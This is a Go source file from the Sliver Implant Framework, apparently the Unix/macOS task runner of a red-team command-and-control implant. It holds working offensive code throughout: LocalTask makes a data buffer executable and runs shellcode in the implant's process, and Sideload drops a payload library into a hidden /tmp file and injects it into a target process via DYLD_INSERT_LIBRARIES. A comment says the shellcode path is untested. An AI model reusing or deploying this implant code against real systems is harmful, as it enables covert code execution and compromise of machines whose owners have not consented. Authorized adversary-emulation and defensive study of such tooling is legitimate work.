package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"strings"
	"sync"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"
)

// LocalTask - Run a shellcode in the current process
// Will hang the process until shellcode completion
// TODO: actually test this code
// Adapted/stolen from: https://github.com/lesnuages/hershell/blob/master/shell/shell_default.go#L48
func LocalTask(data []byte, rwxPages bool) error {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&data)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	go func(fPtr func()) {
		fPtr()
	}(funcPtr)
	return nil
}

// RemoteTask -
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	return nil
}

// Sideload - Side load a library and return its output
func Sideload(procName string, procArgs []string, _ uint32, data []byte, args []string, kill bool) (string, error) {
	var (
		stdOut bytes.Buffer
		stdErr bytes.Buffer
		wg     sync.WaitGroup
		cmd    *exec.Cmd
	)
	fdPath := fmt.Sprintf("/tmp/.%s", RandomString(10))
	err := ioutil.WriteFile(fdPath, data, 0755)
	if err != nil {
		return "", err
	}
	env := os.Environ()
	newEnv := []string{
		fmt.Sprintf("LD_PARAMS=%s", strings.Join(args, " ")),
		fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", fdPath),
	}
	env = append(env, newEnv...)
	if len(procArgs) > 0 {
		cmd = exec.Command(procName, procArgs...)
	} else {
		cmd = exec.Command(procName)
	}
	cmd.Env = env
	cmd.Stdout = &stdOut
	cmd.Stderr = &stdErr
	//{{if .Config.Debug}}
	log.Printf("Starting %s\n", cmd.String())
	//{{end}}
	wg.Add(1)
	go startAndWait(cmd, &wg)
	// Wait for process to terminate
	wg.Wait()
	// Cleanup
	os.Remove(fdPath)

	if len(stdErr.Bytes()) > 0 {
		return "", fmt.Errorf(stdErr.String())
	}
	//{{if .Config.Debug}}
	log.Printf("Done, stdout: %s\n", stdOut.String())
	log.Printf("Done, stderr: %s\n", stdErr.String())
	//{{end}}
	return stdOut.String(), nil
}
